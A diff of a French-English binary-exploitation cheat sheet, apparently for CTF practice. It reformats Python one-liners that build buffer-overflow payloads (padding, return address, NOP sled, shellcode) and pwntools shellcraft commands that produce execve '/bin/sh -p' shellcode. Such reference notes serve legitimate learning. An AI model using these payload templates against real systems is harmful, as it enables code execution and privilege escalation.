@@ -49,9 +49,23 @@ rabin2 -qs <binary> && grep -ve imp -e ' 0 '
 | `nm  && grep ' t '` | vérifier les noms de méthodes (plus préci que r2)|
 
 # ***payload with python***
-| `python3 -c "import sys;import pwn;sys.stdout.buffer.write(b'A'*<offset>+pwn.p32(0xdeedbeaf))" > payload` | create x32 payloads |
+create x32 payloads
+```
+python3 -c "import sys;import pwn;sys.stdout.buffer.write(b'A'*<offset>+pwn.p32(0xdeedbeaf))" > payload
+```
+```
+python3 -c "import sys;sys.stdout.buffer.write(b'A'*<offset>+b'\xaf\xbe\xed\xde')" > payload
+```
+
 | `python3 -c "import sys;import pwn;sys.stdout.buffer.write(pwn.cyclic(<offset>)+pwn.p32(<&ESP>+200)+b'\x90'*1000+b'<shellcode>')" > attack` |creat payload with shellcode (check message "Trace/breakpoint trap" in gdb)  |
 # *shellcraft* 
 | `shellcraft <arch>.<os>.<cmd> -f s` | imprimera le shellcode au format chaine ex : shellcraft i386.linux.sh -f s|
-| `shellcraft i386.linux.execve "/path///<cmd>" "['<cmd>', '<cmd's arg>']" -f s` | imprimera le shellcode au format chaine avec les arguments de la commande ex : shellcraft i386.linux.execve "/bin///sh" "['sh', '-p']" -f s |
+ imprimera le shellcode au format chaine avec les arguments de la commande ex : shellcraft i386.linux.execve "/bin///sh" "['sh', '-p']" -f s |
+ 
+```
+ shellcraft i386.linux.execve "/path///<cmd>" "['<cmd>', '<cmd's arg>']" -f s
+```
 
+```
+ shellcraft i386.linux.execve "/bin///sh" "['sh', '-p']" -f s
+```
